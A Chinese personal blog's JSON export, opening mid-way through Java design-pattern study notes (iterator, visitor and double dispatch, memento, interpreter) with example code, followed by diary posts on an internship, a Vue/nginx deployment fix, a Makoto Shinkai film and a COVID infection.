ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;        implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable &#123;        public Iterator&lt;E&gt; iterator() &#123;        return new Itr();    &#125;        private class Itr implements Iterator&lt;E&gt; &#123;       int cursor;       // 下一个要返回元素的索引       int lastRet = -1; // 上一个返回元素的索引       int expectedModCount = modCount;       Itr() &#123;       &#125;       //判断是否还有元素       public boolean hasNext() &#123;          return cursor != size;       &#125;       //获取下一个元素       public E next() &#123;          checkForComodification();          int i = cursor;          if (i &gt;= size)             throw new NoSuchElementException();          Object[] elementData = ArrayList.this.elementData;          if (i &gt;= elementData.length)             throw new ConcurrentModificationException();          cursor = i + 1;          return (E) elementData[lastRet = i];       &#125;        ...    &#125;&#125;\n\n这部分代码还是比较简单，大致就是在 iterator 方法中返回了一个实例化的 Iterator 对象。Itr是一个内部类，它实现了 Iterator 接口并重写了其中的抽象方法。\n\n注意：当我们在使用JAVA开发的时候，想使用迭代器模式的话，只要让我们自己定义的容器类实现java.util.Iterable并实现其中的iterator()方法使其返回一个 java.util.Iterator 的实现类就可以了。\n\n访问者模式概述定义：封装一些作用于某种数据结构中的各元素的操作，它可以在不改变这个数据结构的前提下定义作用于这些元素的新的操作。\n结构访问者模式包含以下主要角色:\n\n抽象访问者（Visitor）角色：定义了对每一个元素（Element）访问的行为，它的参数就是可以访问的元素，它的方法个数理论上来讲与元素类个数（Element的实现类个数）是一样的，从这点不难看出，访问者模式要求元素类的个数不能改变。\n具体访问者（ConcreteVisitor）角色：给出对每一个元素类访问时所产生的具体行为。\n抽象元素（Element）角色：定义了一个接受访问者的方法（accept），其意义是指，每一个元素都要可以被访问者访问。\n具体元素（ConcreteElement）角色： 提供接受访问方法的具体实现，而这个具体的实现，通常情况下是使用访问者提供的访问该元素类的方法。\n对象结构（Object Structure）角色：定义当中所提到的对象结构，对象结构是一个抽象表述，具体点可以理解为一个具有容器性质或者复合对象特性的类，它会含有一组元素（Element），并且可以迭代这些元素，供访问者访问。\n\n案例实现例：给宠物喂食现在养宠物的人特别多，我们就以这个为例，当然宠物还分为狗，猫等，要给宠物喂食的话，主人可以喂，其他人也可以喂食。\n\n访问者角色：给宠物喂食的人\n具体访问者角色：主人、其他人\n抽象元素角色：动物抽象类\n具体元素角色：宠物狗、宠物猫\n结构对象角色：主人家\n\n类图如下：\n\n代码如下：\n创建抽象访问者接口\npublic interface Person &#123;    void feed(Cat cat);    void feed(Dog dog);&#125;\n\n创建不同的具体访问者角色（主人和其他人），都需要实现 Person接口\npublic class Owner implements Person &#123;    @Override    public void feed(Cat cat) &#123;        System.out.println(&quot;主人喂食猫&quot;);    &#125;    @Override    public void feed(Dog dog) &#123;        System.out.println(&quot;主人喂食狗&quot;);    &#125;&#125;public class Someone implements Person &#123;    @Override    public void feed(Cat cat) &#123;        System.out.println(&quot;其他人喂食猫&quot;);    &#125;    @Override    public void feed(Dog dog) &#123;        System.out.println(&quot;其他人喂食狗&quot;);    &#125;&#125;\n\n定义抽象节点 – 宠物\npublic interface Animal &#123;    void accept(Person person);&#125;\n\n定义实现Animal接口的 具体节点（元素）\npublic class Dog implements Animal &#123;    @Override    public void accept(Person person) &#123;        person.feed(this);        System.out.println(&quot;好好吃，汪汪汪！！！&quot;);    &#125;&#125;public class Cat implements Animal &#123;    @Override    public void accept(Person person) &#123;        person.feed(this);        System.out.println(&quot;好好吃，喵喵喵！！！&quot;);    &#125;&#125;\n\n定义对象结构，此案例中就是主人的家\npublic class Home &#123;    private List&lt;Animal&gt; nodeList = new ArrayList&lt;Animal&gt;();    public void action(Person person) &#123;        for (Animal node : nodeList) &#123;            node.accept(person);        &#125;    &#125;    //添加操作    public void add(Animal animal) &#123;        nodeList.add(animal);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        Home home = new Home();        home.add(new Dog());        home.add(new Cat());        Owner owner = new Owner();        home.action(owner);        Someone someone = new Someone();        home.action(someone);    &#125;&#125;\n\n优缺点\n优点：\n\n扩展性好在不修改对象结构中的元素的情况下，为对象结构中的元素添加新的功能。\n复用性好通过访问者来定义整个对象结构通用的功能，从而提高复用程度。\n分离无关行为通过访问者来分离无关的行为，把相关的行为封装在一起，构成一个访问者，这样每一个访问者的功能都比较单一。\n\n\n缺点：\n\n对象结构变化很困难在访问者模式中，每增加一个新的元素类，都要在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”。\n违反了依赖倒置原则访问者模式依赖了具体类，而没有依赖抽象类。\n\n\n\n使用场景\n对象结构相对稳定，但其操作算法经常变化的程序。\n对象结构中的对象需要提供多种不同且不相关的操作，而且要避免让这些操作的变化影响对象的结构。\n\n扩展访问者模式用到了一种双分派的技术。\n\n分派：变量被声明时的类型叫做变量的静态类型，有些人又把静态类型叫做明显类型；而变量所引用的对象的真实类型又叫做变量的实际类型。比如 Map map = new HashMap() ，map变量的静态类型是 Map ，实际类型是 HashMap 。根据对象的类型而对方法进行的选择，就是分派(Dispatch)，分派(Dispatch)又分为两种，即静态分派和动态分派。静态分派(Static Dispatch) 发生在编译时期，分派根据静态类型信息发生。静态分派对于我们来说并不陌生，方法重载就是静态分派。动态分派(Dynamic Dispatch) 发生在运行时期，动态分派动态地置换掉某个方法。Java通过方法的重写支持动态分派。\n\n动态分派：通过方法的重写支持动态分派。\n\n\npublic class Animal &#123;    public void execute() &#123;        System.out.println(&quot;Animal&quot;);    &#125;&#125;public class Dog extends Animal &#123;    @Override    public void execute() &#123;        System.out.println(&quot;dog&quot;);    &#125;&#125;public class Cat extends Animal &#123;     @Override    public void execute() &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Dog();        a.execute();                Animal a1 = new Cat();        a1.execute();    &#125;&#125;\n\n上面代码就是多态！运行执行的是子类中的方法。Java编译器在编译时期并不总是知道哪些代码会被执行，因为编译器仅仅知道对象的静态类型，而不知道对象的真实类型；而方法的调用则是根据对象的真实类型，而不是静态类型。\n\n静态分派：通过方法重载支持静态分派。\n\npublic class Animal &#123;&#125;public class Dog extends Animal &#123;&#125;public class Cat extends Animal &#123;&#125;public class Execute &#123;    public void execute(Animal a) &#123;        System.out.println(&quot;Animal&quot;);    &#125;    public void execute(Dog d) &#123;        System.out.println(&quot;dog&quot;);    &#125;    public void execute(Cat c) &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Animal();        Animal a1 = new Dog();        Animal a2 = new Cat();        Execute exe = new Execute();        exe.execute(a);        exe.execute(a1);        exe.execute(a2);    &#125;&#125;\n\n运行结果：\n\n这个结果可能出乎一些人的意料了，为什么呢？重载方法的分派是根据静态类型进行的，这个分派过程在编译时期就完成了。\n\n双分派：所谓双分派技术就是在选择一个方法的时候，不仅仅要根据消息接收者（receiver）的运行时区别，还要根据参数的运行时区别。\n\npublic class Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Dog extends Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Cat extends Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Execute &#123;    public void execute(Animal a) &#123;        System.out.println(&quot;animal&quot;);    &#125;    public void execute(Dog d) &#123;        System.out.println(&quot;dog&quot;);    &#125;    public void execute(Cat c) &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Animal();        Animal d = new Dog();        Animal c = new Cat();        Execute exe = new Execute();        a.accept(exe);        d.accept(exe);        c.accept(exe);    &#125;&#125;\n\n在上面代码中，客户端将Execute对象做为参数传递给Animal类型的变量调用的方法，这里完成第一次分派，这里是方法重写，所以是动态分派，也就是执行实际类型中的方法，同时也将自己this作为参数传递进去，这里就完成了第二次分派，这里的Execute类中有多个重载的方法，而传递进行的是this，就是具体的实际类型的对象。双分派可以实现方法的动态绑定，可以对上面的程序进行修改。\n运行结果如下：\n\n双分派实现动态绑定的本质，就是在重载方法委派的前面加上了继承体系中覆盖的环节，由于覆盖是动态的，所以重载就是动态的了。\n备忘录模式概述备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原。很多软件都提供了撤销（Undo）操作，如 Word、记事本、Photoshop、IDEA等软件在编辑时按 Ctrl+Z 组合键时能撤销当前操作，使文档恢复到之前的状态；还有在 浏览器 中的后退键、数据库事务管理中的回滚操作、玩游戏时的中间结果存档功能、数据库与操作系统的备份操作、棋类游戏中的悔棋功能等都属于这类。\n定义：又叫快照模式，在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。\n结构备忘录模式的主要角色如下：\n\n发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。\n备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。\n管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。\n\n\n备忘录有两个等效的接口：\n\n窄接口：管理者(Caretaker)对象（和其他发起人对象之外的任何对象）看到的是备忘录的窄接口(narror Interface)，这个窄接口只允许他把备忘录对象传给其他的对象。\n宽接口：与管理者看到的窄接口相反，发起人对象可以看到一个宽接口(wide Interface)，这个宽接口允许它读取所有的数据，以便根据这些数据恢复这个发起人对象的内部状态。\n\n\n案例实现例：游戏挑战BOSS游戏中的某个场景，一游戏角色有生命力、攻击力、防御力等数据，在打Boss前和后一定会不一样的，我们允许玩家如果感觉与Boss决斗的效果不理想可以让游戏恢复到决斗之前的状态。\n要实现上述案例，有两种方式：\n\n“白箱”备忘录模式\n“黑箱”备忘录模式\n\n“白箱”备忘录模式备忘录角色对任何对象都提供一个接口，即宽接口，备忘录角色的内部所存储的状态就对所有对象公开。类图如下：\n\n代码如下：\n//游戏角色类public class GameRole &#123;    private int vit; //生命力    private int atk; //攻击力    private int def; //防御力    //初始化状态    public void initState() &#123;        this.vit = 100;        this.atk = 100;        this.def = 100;    &#125;    //战斗    public void fight() &#123;        this.vit = 0;        this.atk = 0;        this.def = 0;    &#125;    //保存角色状态    public RoleStateMemento saveState() &#123;        return new RoleStateMemento(vit, atk, def);    &#125;    //回复角色状态    public void recoverState(RoleStateMemento roleStateMemento) &#123;        this.vit = roleStateMemento.getVit();        this.atk = roleStateMemento.getAtk();        this.def = roleStateMemento.getDef();    &#125;    public void stateDisplay() &#123;        System.out.println(&quot;角色生命力：&quot; + vit);        System.out.println(&quot;角色攻击力：&quot; + atk);        System.out.println(&quot;角色防御力：&quot; + def);    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;&#125;//游戏状态存储类(备忘录类)public class RoleStateMemento &#123;    private int vit;    private int atk;    private int def;    public RoleStateMemento(int vit, int atk, int def) &#123;        this.vit = vit;        this.atk = atk;        this.def = def;    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;&#125;//角色状态管理者类public class RoleStateCaretaker &#123;    private RoleStateMemento roleStateMemento;    public RoleStateMemento getRoleStateMemento() &#123;        return roleStateMemento;    &#125;    public void setRoleStateMemento(RoleStateMemento roleStateMemento) &#123;        this.roleStateMemento = roleStateMemento;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;------------大战Boss前------------&quot;);        //大战Boss前        GameRole gameRole = new GameRole();        gameRole.initState();        gameRole.stateDisplay();        //保存进度        RoleStateCaretaker roleStateCaretaker = new RoleStateCaretaker();        roleStateCaretaker.setRoleStateMemento(gameRole.saveState());        System.out.println(&quot;------------大战Boss后------------&quot;);        //大战Boss时，损耗严重        gameRole.fight();        gameRole.stateDisplay();        System.out.println(&quot;------------恢复之前状态------------&quot;);        //恢复之前状态        gameRole.recoverState(roleStateCaretaker.getRoleStateMemento());        gameRole.stateDisplay();    &#125;&#125;\n\n\n分析：白箱备忘录模式是破坏封装性的。但是通过程序员自律，同样可以在一定程度上实现模式的大部分用意。\n\n“黑箱”备忘录模式备忘录角色对发起人对象提供一个宽接口，而为其他对象提供一个窄接口。在Java语言中，实现双重接口的办法就是将备忘录类设计成发起人类的内部成员类。\n将 RoleStateMemento 设为 GameRole 的内部类，从而将 RoleStateMemento 对象封装在 GameRole 里面；在外面提供一个标识接口 Memento 给 RoleStateCaretaker 及其他对象使用。这样 GameRole 类看到的是 RoleStateMemento 所有的接口，而RoleStateCaretaker  及其他对象看到的仅仅是标识接口 Memento 所暴露出来的接口，从而维护了封装型。类图如下：\n\n代码如下：\n窄接口Memento，这是一个标识接口，因此没有定义出任何的方法\npublic interface Memento &#123;&#125;\n\n定义发起人类 GameRole，并在内部定义备忘录内部类 RoleStateMemento（该内部类设置为私有的）\n//游戏角色类public class GameRole &#123;    private int vit; //生命力    private int atk; //攻击力    private int def; //防御力    //初始化状态    public void initState() &#123;        this.vit = 100;        this.atk = 100;        this.def = 100;    &#125;    //战斗    public void fight() &#123;        this.vit = 0;        this.atk = 0;        this.def = 0;    &#125;    //保存角色状态    public Memento saveState() &#123;        return new RoleStateMemento(vit, atk, def);    &#125;    //回复角色状态    public void recoverState(Memento memento) &#123;        RoleStateMemento roleStateMemento = (RoleStateMemento) memento;        this.vit = roleStateMemento.getVit();        this.atk = roleStateMemento.getAtk();        this.def = roleStateMemento.getDef();    &#125;    public void stateDisplay() &#123;        System.out.println(&quot;角色生命力：&quot; + vit);        System.out.println(&quot;角色攻击力：&quot; + atk);        System.out.println(&quot;角色防御力：&quot; + def);    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;    private class RoleStateMemento implements Memento &#123;        private int vit;        private int atk;        private int def;        public RoleStateMemento(int vit, int atk, int def) &#123;            this.vit = vit;            this.atk = atk;            this.def = def;        &#125;        public int getVit() &#123;            return vit;        &#125;        public void setVit(int vit) &#123;            this.vit = vit;        &#125;        public int getAtk() &#123;            return atk;        &#125;        public void setAtk(int atk) &#123;            this.atk = atk;        &#125;        public int getDef() &#123;            return def;        &#125;        public void setDef(int def) &#123;            this.def = def;        &#125;    &#125;&#125;\n\n负责人角色类 RoleStateCaretaker 能够得到的备忘录对象是以 Memento 为接口的，由于这个接口仅仅是一个标识接口，因此负责人角色不可能改变这个备忘录对象的内容\n//角色状态管理者类public class RoleStateCaretaker &#123;    private Memento memento;    public Memento getMemento() &#123;        return memento;    &#125;    public void setMemento(Memento memento) &#123;        this.memento = memento;    &#125;&#125;\n\n客户端测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;------------大战Boss前------------&quot;);        //大战Boss前        GameRole gameRole = new GameRole();        gameRole.initState();        gameRole.stateDisplay();        //保存进度        RoleStateCaretaker roleStateCaretaker = new RoleStateCaretaker();        roleStateCaretaker.setMemento(gameRole.saveState());                System.out.println(&quot;------------大战Boss后------------&quot;);        //大战Boss时，损耗严重        gameRole.fight();        gameRole.stateDisplay();        System.out.println(&quot;------------恢复之前状态------------&quot;);        //恢复之前状态        gameRole.recoverState(roleStateCaretaker.getMemento());        gameRole.stateDisplay();    &#125;&#125;\n\n优缺点\n优点：\n\n提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态。\n实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息。\n简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。\n\n\n缺点：\n\n资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。\n\n\n\n使用场景\n需要保存与恢复数据的场景，如玩游戏时的中间结果的存档功能。\n需要提供一个可回滚操作的场景，如 Word、记事本、Photoshop，idea等软件在编辑时按 Ctrl+Z 组合键，还有数据库中事务操作。\n\n解释器模式概述\n如上图，设计一个软件用来进行加减计算。我们第一想法就是使用工具类，提供对应的加法和减法的工具方法。\n//用于两个整数相加public static int add(int a,int b)&#123;    return a + b;&#125;//用于两个整数相加public static int add(int a,int b,int c)&#123;    return a + b + c;&#125;//用于n个整数相加public static int add(Integer ... arr) &#123;    int sum = 0;    for (Integer i : arr) &#123;        sum += i;    &#125;    return sum;&#125;\n\n上面的形式比较单一、有限，如果形式变化非常多，这就不符合要求，因为加法和减法运算，两个运算符与数值可以有无限种组合方式。比如 1+2+3+4+5、1+2+3-4等等。显然，现在需要一种翻译识别机器，能够解析由数字以及 + - 符号构成的合法的运算序列。如果把运算符和数字都看作节点的话，能够逐个节点的进行读取解析运算，这就是解释器模式的思维。\n定义：给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。\n在解释器模式中，我们需要将待解决的问题，提取出规则，抽象为一种“语言”。比如加减法运算，规则为：由数值和+-符号组成的合法序列，“1+3-2” 就是这种语言的句子。解释器就是要解析出来语句的含义。\n文法（语法）规则：文法是用于描述语言的语法结构的形式规则。\nexpression ::= value | plus | minusplus ::= expression ‘+’ expression   minus ::= expression ‘-’ expression  value ::= integer\n\n\n这里的符号“::&#x3D;”表示“定义为”的意思，竖线 | 表示或，左右的其中一个，引号内为字符本身，引号外为语法。\n\n上面规则描述为：表达式可以是一个值，也可以是plus或者minus运算，而plus和minus又是由表达式结合运算符构成，值的类型为整型数。\n抽象语法树：在计算机科学中，抽象语法树（AbstractSyntaxTree，AST），或简称语法树（Syntax tree），是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。用树形来表示符合文法规则的句子。\n\n结构解释器模式包含以下主要角色。\n\n抽象表达式（Abstract Expression）角色：定义解释器的接口，约定解释器的解释操作，主要包含解释方法 interpret()。\n终结符表达式（Terminal  Expression）角色：是抽象表达式的子类，用来实现文法中与终结符相关的操作，文法中的每一个终结符都有一个具体终结表达式与之相对应。\n非终结符表达式（Nonterminal Expression）角色：也是抽象表达式的子类，用来实现文法中与非终结符相关的操作，文法中的每条规则都对应于一个非终结符表达式。\n环境（Context）角色：通常包含各个解释器需要的数据或是公共的功能，一般用来传递被所有解释器共享的数据，后面的解释器可以从这里获取这些值。\n客户端（Client）：主要任务是将需要分析的句子或表达式转换成使用解释器对象描述的抽象语法树，然后调用解释器的解释方法，当然也可以通过环境角色间接访问解释器的解释方法。\n\n案例实现例：设计实现加减法的软件\n\n代码如下：\n//抽象角色AbstractExpressionpublic abstract class AbstractExpression &#123;    public abstract int interpret(Context context);&#125;//终结符表达式角色public class Value extends AbstractExpression &#123;    private int value;    public Value(int value) &#123;        this.value = value;    &#125;    @Override    public int interpret(Context context) &#123;        return value;    &#125;    @Override    public String toString() &#123;        return new Integer(value).toString();    &#125;&#125;//非终结符表达式角色  加法表达式public class Plus extends AbstractExpression &#123;    private AbstractExpression left;    private AbstractExpression right;    public Plus(AbstractExpression left, AbstractExpression right) &#123;        this.left = left;        this.right = right;    &#125;    @Override    public int interpret(Context context) &#123;        return left.interpret(context) + right.interpret(context);    &#125;    @Override    public String toString() &#123;        return &quot;(&quot; + left.toString() + &quot; + &quot; + right.toString() + &quot;)&quot;;    &#125;&#125;//非终结符表达式角色 减法表达式public class Minus extends AbstractExpression &#123;    private AbstractExpression left;    private AbstractExpression right;    public Minus(AbstractExpression left, AbstractExpression right) &#123;        this.left = left;        this.right = right;    &#125;    @Override    public int interpret(Context context) &#123;        return left.interpret(context) - right.interpret(context);    &#125;    @Override    public String toString() &#123;        return &quot;(&quot; + left.toString() + &quot; - &quot; + right.toString() + &quot;)&quot;;    &#125;&#125;//终结符表达式角色 变量表达式public class Variable extends AbstractExpression &#123;    private String name;    public Variable(String name) &#123;        this.name = name;    &#125;    @Override    public int interpret(Context ctx) &#123;        return ctx.getValue(this);    &#125;    @Override    public String toString() &#123;        return name;    &#125;&#125;//环境类public class Context &#123;    private Map&lt;Variable, Integer&gt; map = new HashMap&lt;Variable, Integer&gt;();    public void assign(Variable var, Integer value) &#123;        map.put(var, value);    &#125;    public int getValue(Variable var) &#123;        Integer value = map.get(var);        return value;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Context context = new Context();        Variable a = new Variable(&quot;a&quot;);        Variable b = new Variable(&quot;b&quot;);        Variable c = new Variable(&quot;c&quot;);        Variable d = new Variable(&quot;d&quot;);        Variable e = new Variable(&quot;e&quot;);        //Value v = new Value(1);        context.assign(a, 1);        context.assign(b, 2);        context.assign(c, 3);        context.assign(d, 4);        context.assign(e, 5);        AbstractExpression expression = new Minus(new Plus(new Plus(new Plus(a, b), c), d), e);        System.out.println(expression + &quot;= &quot; + expression.interpret(context));    &#125;&#125;\n\n优缺点\n优点：\n\n易于改变和扩展文法。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。\n实现文法较为容易。在抽象语法树中每一个表达式节点类的实现方式都是相似的，这些类的代码编写都不会特别复杂。\n增加新的解释表达式较为方便。如果用户需要增加新的解释表达式只需要对应增加一个新的终结符表达式或非终结符表达式类，原有表达式类代码无须修改，符合 “开闭原则”。\n\n\n缺点：\n\n对于复杂文法难以维护。在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，类的个数将会急剧增加，导致系统难以管理和维护。\n执行效率较低。由于在解释器模式中使用了大量的循环和递归调用，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。\n\n\n\n使用场景\n当语言的文法较为简单，且执行效率不是关键问题时。\n当问题重复出现，且可以用一种简单的语言来进行表达时。\n当一个语言需要解释执行，并且语言中的句子可以表示为一个抽象语法树的时候。\n\n总结目前为止最长且花得时间最久的，不想总结了。\n设计模式算是了解了一遍，具体的还得在以后的写代码的过程中慢慢深入体会。以后看一些框架源码应该会更加轻松一些吧。（也许）\n","categories":["学习笔记"],"tags":["java","设计模式","设计原则","UML"]},{"title":"近期情况-2023-7-18","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%BF%91%E6%9C%9F%E6%83%85%E5%86%B5-2023-7-18/","content":"关于博客看了眼博客，上次更新已经是两个月前了。还是技术无关的更新，技术相关的更新已经快四个月前了。与我一开始建博客时至少一个月一篇的期望有所背离。我也逐渐理解了那些更新了很久的博客逐渐停更，然后销声匿迹。\n我还是会继续更新的，虽然已然没有最开始建站时的兴致和精力。更新的频率大抵会比以前慢很多很多。遗憾总会有的，但不写的遗憾更大。\n关于工作工作遥遥无期，准确的说是实习都遥遥无期。虽然九十月份秋招了，但现在来看，我没什么状态。也许九十月份会好很多吧。\n三月中下旬认识了李lm学长，了解了他关于AIGC创业的想法。其实那时候他做了应该有段时间了，前期的调研，以及对产品的定位和预期。四月底左右，我进了他们的企业微信，算是正式接触这个项目。然后就是配环境。加gitlab，clone代码，然后运行程序。当然，他们的项目肯定没那么简单。光lamp平台（灯灯）我就折腾了很久，一个微服务中后台快速开发平台，专注于多租户(SaaS架构)解决方案。基础、系统、认证、网关、监控服务，启动起来。还有mysql当然少不了。微服务嘛，nacos也来一个。redis啊，rabbitmq也少不了。AIGC嘛，向量数据库也是必须的。还没开始写代码，我的16g小电脑以及卡死了。idea能吃很多很多内存。\n整不了，于是把数据库、缓存、nacos什么的全都放在docker里扔到服务器。4c4g的小服务器甚至宕机了几次，确认运行不了，只能少放一点上去。本地电脑也稍微好了一点。也坚定了我换电脑要换64g内存的想法。淦tm的idea，垃圾Java就这样，六七个微服务，还有向量数据库，在我的本地跑了起来。勉勉强强。没钱做什么微服务\n关于面试五月底，学校实训的双选会，有五六家合作企业来面试。陆陆续续两个星期。其中苏州安软面试了我四轮，然后挂了，我一定要记下来。我很不理解，他们来面试究竟看重什么。好像并不是那么的看重你会什么。另外几家也有大点公司（海澜之家），身份信息要的很全。emmmmm，而且线上面试的时候，面试官离摄像头很远。就面了一轮。\n总之，那几周的面试都很失败。\n关于补课不知道学院是怎么安排的，我们要在外实训的同时在学校里上课。院长知道后，更离谱的来了。要在两周上完下学期的两门课，同时完成考核。于是一门课一天隔着上，每天两三个实验或者练习。一共做了四十来个。随后就考试，vue的期末大作业就一个记事本的功能。虽然..有很多需求需要实现。\n总之也是十分的离谱\n关于实训双选会面试全寄，让我不得不来学校安排的实训。今天是上课的第一天。给我的感觉那是十分的糟糕。其实在昨天刚来的时候，就有预兆。\n首先是生活方面，宿舍好评的点就是大。其他都比较拉跨。过道茂密的树木。和脱落的墙皮，一眼就知道这至少十年往上的老人才公寓。与隔河的小区显得格格不入。\n另外这里是郊区，软件园在郊区倒也正常。第一天来这吃个午饭走了快一公里在隔壁小区附近才找到个沙县和超市。如果这里不是有几个学校五六百号人来实训，我估计连外卖店都要少很多很多。因为除了这个实训基地，附近好像再无别的软件公司。为了严谨去看了看，只有一个党校和两个小学，还有几个小区。\n还有这公司老师之类的人给我的感觉也是精神状态不怎么样。上班哪有不疯的最后一个就是，讲的方言一点都听不明白。\n关于羽毛球羽毛球每周应该都会打一两次，能感觉到自己的提升。24磅的拍子该重新拉线了，还是要换个新拍子。最近新环境花费较多，还是暂时不考虑了。另外28磅的拍子用着是真爽。\n昨天和打了三年五年的大佬打了一次。强是真的强，希望能学到更多。回去打爆瓜和格机格机！现在想起来，那段时间是非常快乐的。以后应该很难再有了。\nEND因为补课和实训的原因，没办法继续跟李ml、王y、沈h学长他们做东西，是蛮可惜的。那个微服务的项目对我的提升肯定是比实训带给我的提升要大的。从今天第一天的课我就敢这么断定。十月份左右应该还是有机会的。全是选择与被选择。\n最近的状态很糟糕，近期做完vue的大作业要补一些以前想写但没有写的坑。\n","categories":["记录生活"],"tags":["日记"]},{"title":"铃芽户缔！真好看！","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E9%93%83%E8%8A%BD%E6%88%B7%E7%BC%94%EF%BC%81%E7%9C%9F%E5%A5%BD%E7%9C%8B%EF%BC%81/","content":"电影无关虽然无关，但是还是要先放个歌\n\n上面是原曲，要vip。博客只能听个响，所以放个翻唱版本的。\n\n\n以下是无关内容\n想不到时隔两天又来写博客了。今天的状态很不错，感觉慢慢地在调整回来了。vue的大作业也是做完了，部署在了自己的云服务器上，到成绩出来再关掉。（我估计老师大概率也不会去部署我写的东西，所以干脆给他部署一份。\n下午的时候姚xh部署他的vue项目出了个问题。vue打包文件dist，放在nginx的html后，启动nginx后，初次加载没有问题，但刷新会404。那个老师半天没讲到重点，一直觉得是没有后端的问题。我认为前后端分离的应用，页面的路由全部交由前端，后端只负责数据。所以问题应该在nginx的配置和vue-router的配置。\n网上搜到的解决方案:因为通常vue项目属于单页面开发。所以只有index.html。解决方案，将访问重定向到index.html这个页面。交由 index.html 去处理对应的路由跳转就好。解决 nginx部署vue刷新、访问路由页面404\n好，解决完问题。下面是电影时间！\n电影有关！新海诚的电影画风我是真喜欢，看的第一部是你的名字还是秒五已经不记得了。只记得后面去他以前的作品，云之彼端，秒五。秒五应该看了有三遍，平淡或许感触才深吧。\n下面是图片\n\n铃芽：让我也坐坐！草太：不可以！“这就是我的结束吗？”铃芽：草太，我能踩在你上面吗？草太：不要先斩后奏！\n“我应该怎么说呢.…无论你现在多么痛彻心扉，这都是成长的必经之路，所以，你不用担心，未来充满着希望，你会遇见自己喜欢的人，也会遇到你喜欢你的人。”“虽然现在你觉得世界一片黑暗，但是黎明的曙光Q终会到来，你会在阳光之下Q长大成人，我很肯定，未来一定会是这样的，因为那已经是注定好的事了。”“姐姐…你是谁。”“我啊…我就是，你的明天。”“呼…其实呀，我在以前，就已经有了最重要的东西了。””我要出发了…！”\n","categories":["记录生活"],"tags":["电影","新海诚"]},{"title":"阳了","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E9%98%B3%E4%BA%86/","content":"如标题一样言简意赅，没错，我阳了。从 2019-2022 新冠肆虐的三年我都没有阳，甚至还因为疫情在 2020 年高考延期了一个月。却在这个时候阳了。很难受。\n5月19号晚上睡觉的时候，就感觉眼睛很疼，我以为是疲劳用眼。就这么睡觉了然后半夜开始出汗。我现在估计那个时候就已经在发烧了。早上醒来的时候，我的脑袋很疼，昏昏沉沉。眼睛也很痛，眼球后面很痛。然后流着鼻涕咳着嗽，躺了一会起床了。\n去医务室看了一下。体温 38度 。难怪头那么疼，给开了盒氨麻美敏胶囊（每次2-4粒，每六小时一次），有医保，-2.9回宿舍之后，店长璐姐给送了两盒药（磷酸奥司他韦颗粒，清宣止咳颗粒）和一盒牛奶。太感谢了\n下午吃完药，睡了一下午。一整天的胃口都不怎么好。醒来的时候烧退了，人也稍微清醒了点。\n东苑食堂二楼，放了一天的《体面》，在这些《体面》里，还有一首《分手快乐》\n\n\n","categories":["记录生活"],"tags":["日记","新冠","病"]}]